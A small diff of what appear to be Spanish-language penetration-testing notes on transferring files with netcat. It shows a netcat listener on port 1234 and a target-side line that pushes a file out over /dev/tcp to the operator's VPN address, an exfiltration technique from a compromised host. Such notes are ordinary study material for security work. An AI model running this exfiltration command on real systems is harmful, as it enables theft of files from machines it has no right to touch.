@@ -11,7 +11,7 @@
 
 *** *** recibir archivos via netcat nc
 
-		::: nc -nlvp 1234 > File_Targed.test
+		::: nc -nlvp 1234 > File_Targed.test		|||   ::: nc -nlvp 1234 | vim -
 
 		targed::: cat < File_Targed > /dev/tcp/$(mvnb --vpn)/1234
 		trgd:::
